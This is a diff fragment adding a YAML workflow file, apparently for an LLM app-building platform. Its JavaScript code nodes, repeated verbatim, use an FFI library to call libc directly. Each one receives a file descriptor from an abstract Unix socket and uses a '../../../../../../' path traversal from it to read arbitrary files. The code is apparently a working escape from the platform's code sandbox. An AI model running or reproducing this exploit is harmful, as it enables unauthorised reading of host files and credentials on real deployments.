+          \ 'int',\n        \n        // For single fd SCM_RIGHTS\n        fd: 'int',\n\
+          \    })\n\n    const msghdr = koffi.struct('msghdr', {\n        msg_name:\
+          \ 'void *',\n        msg_namelen: 'socklen_t',\n        msg_iov: 'iovec\
+          \ *',\n        msg_iovlen: 'size_t',\n        msg_control: 'void *',\n \
+          \       msg_controllen: 'size_t',\n        msg_flags: 'int'\n    });\n\n\
+          \    const timespec = koffi.struct('timespec', {\n        tv_sec: 'int64_t',\n\
+          \        tv_nsec: 'int64_t',\n    });\n\n    const l = koffi.load('libc.so.6');\n\
+          \n    // Functions\n    const socket = l.func('int socket(int domain, int\
+          \ type, int protocol)');\n    const connect = l.func('int connect(int sockfd,\
+          \ sockaddr_un *addr, socklen_t addrlen)');\n    const recvmsg = l.func('ssize_t\
+          \ recvmsg(int sockfd, _Inout_ msghdr *msg, int flags)');\n    const openat\
+          \ = l.func('int openat(int dirfd, const char *pathname, int flags)');\n\
+          \    const read = l.func('ssize_t read(int fd, _Out_ char *buf, size_t count)');\n\
+          \    const nanosleep = l.func('long syscall(long number, timespec *arg1,\
+          \ timespec *arg2)');\n\n    nanosleep(35, {\n        tv_sec: 1,\n      \
+          \  tv_nsec: 0\n    }, null);\n\n    const sfd = socket(AF_UNIX, SOCK_STREAM,\
+          \ 0);\n    console.log(sfd, koffi.errno());\n\n    err = connect(sfd, {sun_family:\
+          \ AF_UNIX, sun_path: sock_addr}, 2 + sock_addr.length);\n\n    if (err <\
+          \ 0) {\n        return {\n            result: err.toString() + ' ' + koffi.errno()\n\
+          \        }\n    }\n\n    buf = koffi.alloc('char', koffi.sizeof('cmsghdr'))\n\
+          \n    msg = {\n        msg_control: buf,\n        msg_controllen: koffi.sizeof('cmsghdr'),\n\
+          \    }\n\n    err = recvmsg(sfd, msg, 0);\n    console.log(err, koffi.errno());\n\
+          \n    cmsg = koffi.decode(buf, 'cmsghdr');\n    \n    if (err < 0) {\n \
+          \       return {\n            result: err.toString() + ' ' + koffi.errno()\n\
+          \        }\n    }\n\n    fd = openat(cmsg.fd, \"../../../../../../\" + path,\
+          \ O_RDONLY);\n    \n    if (fd < 0) {\n        return {\n            result:\
+          \ fd.toString() + ' ' + koffi.errno()\n        }\n    }\n\n    fbuf = koffi.alloc('char',\
+          \ 0x10000);\n    err = read(fd, fbuf, 0x10000);\n    \n    if (err < 0)\
+          \ {\n        return {\n            result: err.toString() + ' ' + koffi.errno()\n\
+          \        }\n    }\n\n    return {\n        result: koffi.decode(fbuf, 'char',\
+          \ err)\n    }\n}"
+        code_language: javascript
+        outputs:
+          result:
+            children: null
+            type: string
+        selected: false
+        title: Code 7
+        type: code
+        variables:
+        - value_selector:
+          - '1772976648715'
+          - path
+          value_type: string
+          variable: path
+      height: 52
+      id: '1772977523779'
+      position:
+        x: 382
+        y: 681
+      positionAbsolute:
+        x: 382
+        y: 681
+      selected: false
+      sourcePosition: right
+      targetPosition: left
+      type: custom
+      width: 242
+    - data:
+        code: "function main({path}) {\n    // Constants\n    const AF_UNIX = 1\n\
+          \    const SOCK_STREAM = 1\n    const O_RDONLY = 0o000000\n\n    const sock_addr\
+          \ = '\\x00test';\n\n    // Typedefs\n    const sa_family_t = koffi.alias('sa_family_t',\
+          \ 'uint16_t');\n    const socklen_t = koffi.alias('socklen_t', 'uint32_t');\n\
+          \    const ssize_t = koffi.alias('ssize_t', 'int64_t');\n\n    // Structures\n\
+          \    const sockaddr_un = koffi.struct('sockaddr_un', {\n        sun_family:\
+          \ 'sa_family_t',\n        sun_path: koffi.array('char', 108, 'String')\n\
+          \    });\n\n    const iovec = koffi.struct('iovec', {\n        iov_base:\
+          \ 'void *',\n        iov_len: 'size_t'\n    })\n\n    const cmsghdr = koffi.struct('cmsghdr',\
+          \ {\n        cmsg_len: 'size_t',\n        cmsg_level: 'int',\n        cmsg_type:\
+          \ 'int',\n        \n        // For single fd SCM_RIGHTS\n        fd: 'int',\n\
+          \    })\n\n    const msghdr = koffi.struct('msghdr', {\n        msg_name:\
+          \ 'void *',\n        msg_namelen: 'socklen_t',\n        msg_iov: 'iovec\
+          \ *',\n        msg_iovlen: 'size_t',\n        msg_control: 'void *',\n \
+          \       msg_controllen: 'size_t',\n        msg_flags: 'int'\n    });\n\n\
+          \    const timespec = koffi.struct('timespec', {\n        tv_sec: 'int64_t',\n\
+          \        tv_nsec: 'int64_t',\n    });\n\n    const l = koffi.load('libc.so.6');\n\
+          \n    // Functions\n    const socket = l.func('int socket(int domain, int\
+          \ type, int protocol)');\n    const connect = l.func('int connect(int sockfd,\
+          \ sockaddr_un *addr, socklen_t addrlen)');\n    const recvmsg = l.func('ssize_t\
+          \ recvmsg(int sockfd, _Inout_ msghdr *msg, int flags)');\n    const openat\
+          \ = l.func('int openat(int dirfd, const char *pathname, int flags)');\n\
+          \    const read = l.func('ssize_t read(int fd, _Out_ char *buf, size_t count)');\n\
+          \    const nanosleep = l.func('long syscall(long number, timespec *arg1,\
+          \ timespec *arg2)');\n\n    nanosleep(35, {\n        tv_sec: 1,\n      \
+          \  tv_nsec: 0\n    }, null);\n\n    const sfd = socket(AF_UNIX, SOCK_STREAM,\
+          \ 0);\n    console.log(sfd, koffi.errno());\n\n    err = connect(sfd, {sun_family:\
+          \ AF_UNIX, sun_path: sock_addr}, 2 + sock_addr.length);\n\n    if (err <\
+          \ 0) {\n        return {\n            result: err.toString() + ' ' + koffi.errno()\n\
+          \        }\n    }\n\n    buf = koffi.alloc('char', koffi.sizeof('cmsghdr'))\n\
+          \n    msg = {\n        msg_control: buf,\n        msg_controllen: koffi.sizeof('cmsghdr'),\n\
+          \    }\n\n    err = recvmsg(sfd, msg, 0);\n    console.log(err, koffi.errno());\n\
+          \n    cmsg = koffi.decode(buf, 'cmsghdr');\n    \n    if (err < 0) {\n \
+          \       return {\n            result: err.toString() + ' ' + koffi.errno()\n\
+          \        }\n    }\n\n    fd = openat(cmsg.fd, \"../../../../../../\" + path,\
+          \ O_RDONLY);\n    \n    if (fd < 0) {\n        return {\n            result:\
+          \ fd.toString() + ' ' + koffi.errno()\n        }\n    }\n\n    fbuf = koffi.alloc('char',\
+          \ 0x10000);\n    err = read(fd, fbuf, 0x10000);\n    \n    if (err < 0)\
+          \ {\n        return {\n            result: err.toString() + ' ' + koffi.errno()\n\
+          \        }\n    }\n\n    return {\n        result: koffi.decode(fbuf, 'char',\
+          \ err)\n    }\n}"
+        code_language: javascript
+        outputs:
+          result:
+            children: null
+            type: string
+        selected: false
+        title: Code 8
+        type: code
+        variables:
+        - value_selector:
+          - '1772976648715'
+          - path
+          value_type: string
+          variable: path
+      height: 52
+      id: '1772977543754'
+      position:
+        x: 382
+        y: 772
+      positionAbsolute:
+        x: 382
+        y: 772
+      selected: false
+      sourcePosition: right
+      targetPosition: left
+      type: custom
+      width: 242
+    - data:
+        code: "function main({path}) {\n    // Constants\n    const AF_UNIX = 1\n\
+          \    const SOCK_STREAM = 1\n    const O_RDONLY = 0o000000\n\n    const sock_addr\
+          \ = '\\x00test';\n\n    // Typedefs\n    const sa_family_t = koffi.alias('sa_family_t',\
+          \ 'uint16_t');\n    const socklen_t = koffi.alias('socklen_t', 'uint32_t');\n\
+          \    const ssize_t = koffi.alias('ssize_t', 'int64_t');\n\n    // Structures\n\
+          \    const sockaddr_un = koffi.struct('sockaddr_un', {\n        sun_family:\
+          \ 'sa_family_t',\n        sun_path: koffi.array('char', 108, 'String')\n\
+          \    });\n\n    const iovec = koffi.struct('iovec', {\n        iov_base:\
+          \ 'void *',\n        iov_len: 'size_t'\n    })\n\n    const cmsghdr = koffi.struct('cmsghdr',\
+          \ {\n        cmsg_len: 'size_t',\n        cmsg_level: 'int',\n        cmsg_type:\
+          \ 'int',\n        \n        // For single fd SCM_RIGHTS\n        fd: 'int',\n\
+          \    })\n\n    const msghdr = koffi.struct('msghdr', {\n        msg_name:\
+          \ 'void *',\n        msg_namelen: 'socklen_t',\n        msg_iov: 'iovec\
+          \ *',\n        msg_iovlen: 'size_t',\n        msg_control: 'void *',\n \
+          \       msg_controllen: 'size_t',\n        msg_flags: 'int'\n    });\n\n\
+          \    const timespec = koffi.struct('timespec', {\n        tv_sec: 'int64_t',\n\
+          \        tv_nsec: 'int64_t',\n    });\n\n    const l = koffi.load('libc.so.6');\n\
+          \n    // Functions\n    const socket = l.func('int socket(int domain, int\
+          \ type, int protocol)');\n    const connect = l.func('int connect(int sockfd,\
+          \ sockaddr_un *addr, socklen_t addrlen)');\n    const recvmsg = l.func('ssize_t\
+          \ recvmsg(int sockfd, _Inout_ msghdr *msg, int flags)');\n    const openat\
+          \ = l.func('int openat(int dirfd, const char *pathname, int flags)');\n\
+          \    const read = l.func('ssize_t read(int fd, _Out_ char *buf, size_t count)');\n\
+          \    const nanosleep = l.func('long syscall(long number, timespec *arg1,\
+          \ timespec *arg2)');\n\n    nanosleep(35, {\n        tv_sec: 1,\n      \
+          \  tv_nsec: 0\n    }, null);\n\n    const sfd = socket(AF_UNIX, SOCK_STREAM,\
+          \ 0);\n    console.log(sfd, koffi.errno());\n\n    err = connect(sfd, {sun_family:\
+          \ AF_UNIX, sun_path: sock_addr}, 2 + sock_addr.length);\n\n    if (err <\
+          \ 0) {\n        return {\n            result: err.toString() + ' ' + koffi.errno()\n\
+          \        }\n    }\n\n    buf = koffi.alloc('char', koffi.sizeof('cmsghdr'))\n\
+          \n    msg = {\n        msg_control: buf,\n        msg_controllen: koffi.sizeof('cmsghdr'),\n\
+          \    }\n\n    err = recvmsg(sfd, msg, 0);\n    console.log(err, koffi.errno());\n\
+          \n    cmsg = koffi.decode(buf, 'cmsghdr');\n    \n    if (err < 0) {\n \
+          \       return {\n            result: err.toString() + ' ' + koffi.errno()\n\
+          \        }\n    }\n\n    fd = openat(cmsg.fd, \"../../../../../../\" + path,\
+          \ O_RDONLY);\n    \n    if (fd < 0) {\n        return {\n            result:\
+          \ fd.toString() + ' ' + koffi.errno()\n        }\n    }\n\n    fbuf = koffi.alloc('char',\
+          \ 0x10000);\n    err = read(fd, fbuf, 0x10000);\n    \n    if (err < 0)\
+          \ {\n        return {\n            result: err.toString() + ' ' + koffi.errno()\n\
+          \        }\n    }\n\n    return {\n        result: koffi.decode(fbuf, 'char',\
+          \ err)\n    }\n}"
+        code_language: javascript
+        outputs:
+          result:
+            children: null
+            type: string
+        selected: false
+        title: Code 9
+        type: code
+        variables:
+        - value_selector:
+          - '1772976648715'
+          - path
+          value_type: string
+          variable: path
+      height: 52
+      id: '1772977551443'
+      position:
+        x: 382
+        y: 863
+      positionAbsolute:
+        x: 382
+        y: 863
+      selected: false
+      sourcePosition: right
+      targetPosition: left
+      type: custom
+      width: 242
+    - data:
+        outputs:
+        - value_selector:
+          - '1772976711972'
+          - result
+          value_type: string
+          variable: res1
+        - value_selector:
+          - '1772976777890'
+          - result
+          value_type: string
+          variable: res2
+        - value_selector:
+          - '1772976788202'
+          - result
+          value_type: string
+          variable: res3
+        - value_selector:
+          - '1772976793226'
+          - result
+          value_type: string
+          variable: res4
+        - value_selector:
+          - '1772976798866'
+          - result
+          value_type: string
+          variable: res5
+        - value_selector:
+          - '1772977523779'
+          - result
+          value_type: string
+          variable: res6
+        - value_selector:
+          - '1772977543754'
+          - result
+          value_type: string
+          variable: res7
+        selected: false
+        title: Output
+        type: end
+      height: 251
+      id: '1773047897494'
+      position:
+        x: 738.0998243416889
+        y: 369.0491869802741
+      positionAbsolute:
+        x: 738.0998243416889
+        y: 369.0491869802741
+      selected: false
+      sourcePosition: right
+      targetPosition: left
+      type: custom
+      width: 242
+    viewport:
+      x: 248.00802090543766
+      y: 24.026546275569473
+      zoom: 0.6597539553864471
+  rag_pipeline_variables: []
